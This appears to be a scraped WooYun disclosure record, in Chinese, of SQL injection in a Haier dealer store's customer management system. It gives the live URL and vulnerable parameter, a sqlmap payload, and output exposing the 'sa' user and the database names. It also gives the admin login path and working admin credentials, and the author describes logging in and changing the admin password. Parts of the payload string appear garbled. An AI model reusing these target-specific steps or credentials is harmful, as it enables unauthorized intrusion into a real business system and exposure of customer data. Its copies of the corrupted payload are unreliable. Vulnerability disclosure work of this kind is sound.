{"id": 59894, "wybug_id": "wooyun-2013-045695", "wybug_title": "海尔集团#某重要管理系统存在SQL注入导致后台沦陷", "wybug_corp": "海尔集团", "wybug_author": "Mr.leo", "wybug_date": "2013-12-13 14:19", "wybug_open_date": "2013-12-18 14:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "后台被猜解", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 海尔集团#某重要管理系统存在SQL注入导致后台沦陷 详细说明：  站点：http://gy.haierzmd.com  灌云县海尔专卖店海尔客户管理系统ID参数没有过滤导致注射漏洞http://gy.haierzmd.com/zclr1.asp?ID=60sqlmap跑起Place: GETParameter: ID    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING claus    Payload: ID=1 AND 8064=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(107)+CHAR(115)HAR(58)+(SELECT (CASE WHEN (8064=8064) THEN CHAR(49) ELSE CHAR(48) END))+CHAR()+CHAR(110)+CHAR(108)+CHAR(117)+CHAR(58)))---[09:52:42] [INFO] testing Microsoft SQL Server[09:52:43] [INFO] confirming Microsoft SQL Server[09:52:43] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[09:52:43] [INFO] fetching current user[09:52:43] [INFO] retrieved: sacurrent user:    'sa'[09:52:43] [INFO] fetching current database[09:52:43] [INFO] retrieved: gy@haier#gy2current database:    'gy@haier#gy2'[09:52:43] [INFO] fetching database names[09:52:43] [INFO] the SQL query used returns 16 entries[09:52:45] [INFO] retrieved: gy@haier#gy2[09:52:45] [INFO] retrieved: master[09:52:45] [INFO] retrieved: tempdb[09:52:45] [INFO] retrieved: model[09:52:45] [INFO] retrieved: msdb[09:52:45] [INFO] retrieved: pubs[09:52:45] [INFO] retrieved: Northwind[09:52:45] [INFO] retrieved: ssy988haier2[09:52:45] [INFO] retrieved: gy@haier#gy2[09:52:45] [INFO] retrieved: xs[09:52:46] [INFO] retrieved: xs@988[09:52:46] [INFO] retrieved: xshaier988haier[09:52:46] [INFO] retrieved: xshaierzmd[09:52:46] [INFO] retrieved: huanghaifeng#988[09:52:46] [INFO] retrieved: shopxp#gsb988[09:52:46] [INFO] retrieved: chenghaiyue#988[09:52:46] [INFO] retrieved: gsb#988[09:52:46] [INFO] retrieved:available databases [17]:[*] chenghaiyue#988[*] gsb#988[*] gy@haier#gy2[*] huanghaifeng#988[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] shopxp#gsb988[*] ssy988haier2[*] tempdb[*] xs[*] xs@988[*] xshaier988haier[*] xshaierzmdSA用户\n\n萝卜\n\n用户名密码侧漏\n\n接下来登录后台后台地址为http://gy.haierzmd.com/admin_login.aspadmin 12345678（原密码为123456，系统提示修改密码,安全测试改成12345678）验证码啥的都是浮云了\n\n查看，添加，删除都有，毕竟是管理员哈。\n\n客户信息\n\n其他就不截图了，over   漏洞证明：  已经证明   修复方案：  1#修复SQL注射漏洞2#增加密码强度、复杂度3#屏蔽管理后台对外   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-18 14:20 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}